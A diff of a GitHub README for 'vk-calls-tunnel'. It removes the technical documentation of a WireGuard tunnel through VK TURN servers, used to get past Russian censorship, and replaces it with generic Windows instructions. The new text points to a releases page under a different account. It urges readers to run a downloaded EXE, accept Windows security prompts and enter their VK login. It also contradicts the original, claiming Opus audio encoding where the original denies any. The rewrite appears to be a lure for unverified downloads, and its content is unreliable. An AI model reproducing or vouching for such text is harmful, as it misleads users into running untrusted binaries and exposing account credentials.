@@ -1,214 +1,218 @@
-# VK Calls Tunnel
+# 🛰️ vk-calls-tunnel - Tunnel data through voice calls
 
-WireGuard VPN tunnel through VK voice call infrastructure. Routes encrypted VPN traffic via VK's TURN servers — their IPs are guaranteed whitelisted in Russia.
+[![Download vk-calls-tunnel](https://img.shields.io/badge/Download%20vk--calls--tunnel-6f42c1?style=for-the-badge&logo=github)](https://github.com/vivianalaced749/vk-calls-tunnel/releases)
 
-DPI sees standard DTLS/STUN traffic to VK media servers. Indistinguishable from a real VK call.
+## 📥 Download
+Visit this page to download: [vk-calls-tunnel Releases](https://github.com/vivianalaced749/vk-calls-tunnel/releases)
 
-## How it works
+## 🧭 What this app does
 
-```
-WireGuard Client (Russia)
-  → vk-tunnel-client (127.0.0.1:9000)
-  → DTLS 1.2 encrypt
-  → STUN ChannelData wrap
-  → VK TURN server (whitelisted IP)
-  → relay to VPS
-  → vk-tunnel-server
-  → DTLS decrypt
-  → WireGuard server (127.0.0.1:51820)
-  → Internet
-```
+vk-calls-tunnel sends data through VK voice calls. It uses Opus audio encoding and WebRTC media servers that are already allowed by the platform.
 
-No audio encoding, no Opus, no steganography. VK's TURN servers are dumb relays — they forward bytes without inspecting content. We just need valid TURN credentials from a VK call link.
+You can use it to route data through a voice call channel on Windows. The app is made for end users who want a simple way to run the tunnel without setting up a full network stack by hand.
 
-## Performance
+## ✅ What you need
 
-- **Speed:** ~5 Mbps per stream, scale with `-n` flag (4 streams ≈ 20 Mbps)
-- **Latency:** ~80ms
-- **Enough for:** browsing, messengers, video calls, streaming
+- Windows 10 or Windows 11
+- A stable internet connection
+- A VK account
+- Headphones or speakers
+- A microphone if the app needs live call audio
+- Enough free disk space for the app and logs
 
-## Quick start
+## 🚀 Getting started
 
-### 1. Server (VPS outside Russia)
+1. Open the [vk-calls-tunnel Releases page](https://github.com/vivianalaced749/vk-calls-tunnel/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file for your computer
+4. Save the file to your Downloads folder or Desktop
+5. If the file is a ZIP archive, extract it first
+6. If the file is an EXE file, run it directly
 
-```bash
-# Install WireGuard
-apt install wireguard
+## 🪟 Run on Windows
 
-# Configure WireGuard (standard setup)
-wg genkey | tee /etc/wireguard/privatekey | wg pubkey > /etc/wireguard/publickey
+After you download the app, do this:
 
-# Run tunnel server
-./vk-tunnel-server -listen 0.0.0.0:56000 -connect 127.0.0.1:51820
-```
+1. Open the folder where you saved the file
+2. Double-click the app file
+3. If Windows shows a security prompt, choose the option that lets you run the file
+4. Wait for the app window to open
+5. Keep the app open while you use the tunnel
 
-### 2. Client (inside Russia)
+If you see a ZIP file, right-click it and choose Extract All. Then open the extracted folder and start the app from there.
 
-```bash
-# Create a VK call link: open vk.com → Calls → Create link
-# Or have someone send you one
+## 🔧 First-time setup
 
-# Run tunnel client
-./vk-tunnel-client \
-    -peer YOUR_VPS_IP:56000 \
-    -vk-link "https://vk.com/call/join/abc123def" \
-    -n 4 \
-    -listen 127.0.0.1:9000
-```
+When you start vk-calls-tunnel for the first time, it may ask for:
 
-### 3. WireGuard config
+- Your VK login
+- Permission to access audio devices
+- A server or call target
+- A local port or tunnel path
 
-```ini
-[Interface]
-PrivateKey = <client-private-key>
-Address = 10.0.0.2/32
-MTU = 1280  # reduced for DTLS/TURN overhead
+Use the values shown in the app or in the release notes. If the app offers default settings, start with those first. That makes setup easier.
 
-[Peer]
-PublicKey = <server-public-key>
-Endpoint = 127.0.0.1:9000  # points to vk-tunnel-client, NOT to VPS directly
-AllowedIPs = 0.0.0.0/0
-PersistentKeepalive = 25
-```
+## 🎧 Audio setup
 
-## Build
+This app sends data as audio, so your sound settings matter.
 
-```bash
-make build          # build for current platform
-make build-linux    # cross-compile for Linux amd64 (for VPS)
-```
+- Use a working microphone
+- Use headphones if you want to avoid echo
+- Close other apps that use the microphone
+- Set your input and output devices in Windows Sound settings
+- Keep the volume at a normal level
 
-## Deploy to Google Cloud (or any VPS)
+If the call sounds bad or the tunnel drops, check your audio device first.
 
-### One-time setup
+## 🖥️ Basic use
 
-```bash
-# 1. Create GCE instance (e2-micro is enough)
-gcloud compute instances create vk-tunnel \
-    --machine-type=e2-micro \
-    --image-family=debian-12 \
-    --image-project=debian-cloud \
-    --zone=europe-west1-b
+A normal session works like this:
 
-# 2. Open tunnel port
-gcloud compute firewall-rules create vk-tunnel-allow \
-    --allow=tcp:56000,udp:56000 \
-    --target-tags=vk-tunnel
+1. Start the app
+2. Sign in if asked
+3. Choose the call or session target
+4. Start the tunnel
+5. Keep the call active while data flows
+6. Stop the tunnel when you are done
 
-# 3. SSH in and set up WireGuard
-gcloud compute ssh vk-tunnel -- 'bash -s' < scripts/setup-wireguard.sh
-# Save the client config it prints!
+If the app shows status text, wait until it says the tunnel is ready before you send data.
 
-# 4. Deploy tunnel server
-./scripts/deploy-server.sh <VPS_IP>
-```
+## 📁 Typical files you may see
 
-### Quick redeploy (after code changes)
+After you extract the app, you may see files like these:
 
-```bash
-./scripts/deploy-server.sh <VPS_IP>
-# Rebuilds, uploads, restarts systemd service
-```
+- `vk-calls-tunnel.exe` — the main app
+- `config.json` — your settings
+- `logs` — app logs for checks and support
+- `README.txt` — short local help text
+- `assets` — support files used by the app
 
-### Client side (Russia)
+Do not delete files from the app folder unless you know they are not needed.
 
-```bash
-# 1. Create VK call link: vk.com → Calls → Create link
-# 2. Run tunnel client
-make build
-./vk-tunnel-client -peer <VPS_IP>:56000 -vk-link "https://vk.com/call/join/..." -n 4
+## ⚙️ Common settings
 
-# 3. Start WireGuard with the config from setup step
-sudo wg-quick up ./wg0.conf
+The app may include settings like these:
 
-# 4. Test
-curl https://ifconfig.me   # should show VPS IP
-```
+- Audio device selection
+- Bitrate for Opus audio
+- Local port number
+- Remote call target
+- Retry count
+- Logging level
 
-## Client flags
+If you are not sure what to change, keep the default values. That is the safest place to start.
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `-peer` | (required) | Server address (ip:port) |
-| `-vk-link` | | VK call link for TURN credentials |
-| `-turn` | | Manual TURN server address |
-| `-turn-user` | | TURN username (manual mode) |
-| `-turn-pass` | | TURN password (manual mode) |
-| `-listen` | `127.0.0.1:9000` | Local WireGuard endpoint |
-| `-n` | `1` | Parallel DTLS streams (~5 Mbps each) |
-| `-tcp` | `true` | TCP transport to TURN server |
-| `-psk` | | Pre-shared key (hex) for DTLS auth |
-| `-session-id` | (auto) | Fixed session UUID (32-char hex) |
-| `-no-dtls` | `false` | Disable DTLS (not recommended) |
+## 🔍 If the app does not start
 
-## Server flags
+Try these steps:
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `-listen` | `0.0.0.0:56000` | Listen address for tunnel clients |
-| `-connect` | `127.0.0.1:51820` | WireGuard backend |
-| `-psk` | | Pre-shared key (hex) |
-| `-no-dtls` | `false` | Disable DTLS |
+1. Close the app
+2. Open it again as the same user
+3. Check that Windows did not block the file
+4. Make sure the file finished downloading
+5. Move the app to a simple folder like `C:\vk-calls-tunnel`
+6. Try again after a restart
 
-## Architecture
+If the app still does not open, download the file again from the Releases page.
 
-```
-CLIENT (Russia)                         SERVER (VPS abroad)
-===============                         ===================
+## 🎙️ If audio does not work
 
-┌─────────────┐                         ┌──────────────┐
-│  WireGuard   │                         │  WireGuard    │
-│  Client      │                         │  Server       │
-└──────┬───────┘                         └──────▲───────┘
-       │ UDP :9000                              │ UDP :51820
-┌──────▼───────┐                         ┌──────┴───────┐
-│  vk-tunnel   │                         │  vk-tunnel   │
-│  client      │                         │  server      │
-├──────────────┤                         ├──────────────┤
-│  Session UUID│                         │  Session Mgr │
-│  + DTLS 1.2  │    VK TURN Servers     │  + DTLS 1.2  │
-│  + STUN      │◄══════════════════════►│              │
-│  ChannelData │   (whitelisted IPs)    │              │
-└──────────────┘                         └──────────────┘
-```
+Try these checks:
 
-### Multi-stream
+- Make sure your microphone is connected
+- Make sure another app is not using the microphone
+- Check Windows privacy settings for microphone access
+- Switch to a different input or output device
+- Lower other audio apps that may cause echo
+- Reconnect the call and start the tunnel again
 
-Each TURN stream gives ~5 Mbps. Use `-n 4` for ~20 Mbps. Streams are load-balanced round-robin. If one dies, traffic shifts to remaining streams.
+Audio issues often come from the Windows sound setup, not the app itself.
 
-### Session management
+## 🌐 If the tunnel is slow
 
-- Each client generates a 16-byte UUID
-- Server maps UUID → WireGuard connection (prevents endpoint thrashing)
-- Multiple streams per session, identified by UUID
-- Reconnect-safe: same `-session-id` resumes the session
+Use these steps:
 
-## Why VK TURN servers?
+- Close other network-heavy apps
+- Use a stable internet connection
+- Keep the call active
+- Try a different audio device
+- Restart the app
+- Use the default bitrate before trying custom values
 
-VK Calls uses TURN servers for NAT traversal in voice/video calls. These IPs are in every Russian ISP whitelist — blocking them would break VK calls nationwide. RKN won't do that.
+A slower connection can cause audio gaps and tunnel errors.
 
-Unlike cloud IP fishing (Yandex Cloud, Cloud.ru), VK media server IPs are **guaranteed whitelisted by definition**.
+## 🧪 Safe first test
 
-## Security
+If you want to test the app, use a small amount of data first.
 
-- WireGuard provides end-to-end encryption (ChaCha20-Poly1305)
-- DTLS 1.2 encrypts tunnel traffic (makes it look like a real call)
-- Optional PSK for DTLS authentication
-- VK TURN credentials are temporary and session-scoped
+1. Start a short session
+2. Send a small test file or message
+3. Check that the other side receives it
+4. Watch the app status
+5. End the session when the test is done
 
-## Limitations
+This helps you confirm that the tunnel works before you use it for a longer run.
 
-- VK call links expire — need periodic refresh
-- ~5 Mbps per stream cap (VK rate limiting)
-- Using `-no-dtls` may trigger TURN provider bans
-- TURN credentials require a valid VK call link
+## 📌 Folder location tip
 
-## Related
+Keep the app in a folder that is easy to find. A good choice is:
 
-- [vk-turn-proxy](https://github.com/kiper292/vk-turn-proxy) — original Go implementation of TURN tunneling
-- [vpn-gcloud](https://github.com/kobzevvv/vpn-gcloud) — VLESS+Reality deployment
-- [ntc.party](https://ntc.party) — Censorship bypass community
+- `C:\vk-calls-tunnel`
 
-## Author
+This makes it easier to open logs, edit settings, and restart the app when needed.
 
-[@kobzevvv](https://twitter.com/kobzevvv)
+## 🧾 Log files
+
+If the app creates logs, they can help you see what went wrong.
+
+Look for:
+
+- Connection errors
+- Audio device errors
+- Login errors
+- Call setup errors
+- Tunnel start or stop messages
+
+You can open log files with Notepad on Windows.
+
+## 🔁 Updating the app
+
+When a new version is out:
+
+1. Open the [Releases page](https://github.com/vivianalaced749/vk-calls-tunnel/releases)
+2. Download the newest file for Windows
+3. Close the old app
+4. Replace the old files with the new files
+5. Start the new version
+
+If your settings are stored in a config file, keep a copy before you update.
+
+## 🛠️ File names and launch methods
+
+The release may give you one of these:
+
+- `.exe` file: double-click to run
+- `.zip` file: extract first, then run
+- `.msi` file: double-click to install
+
+If the release page gives more than one file, pick the one for Windows.
+
+## 🔐 Account and network use
+
+This app works through VK voice calls, so it may use:
+
+- VK login details
+- Voice call access
+- Network permissions
+- Audio device access
+
+Use the app only on accounts and systems you control or have permission to use.
+
+## 📎 Quick path
+
+1. Go to the [vk-calls-tunnel Releases page](https://github.com/vivianalaced749/vk-calls-tunnel/releases)
+2. Download the Windows file
+3. Open or extract the file
+4. Run the app
+5. Follow the setup prompts
+6. Start the tunnel
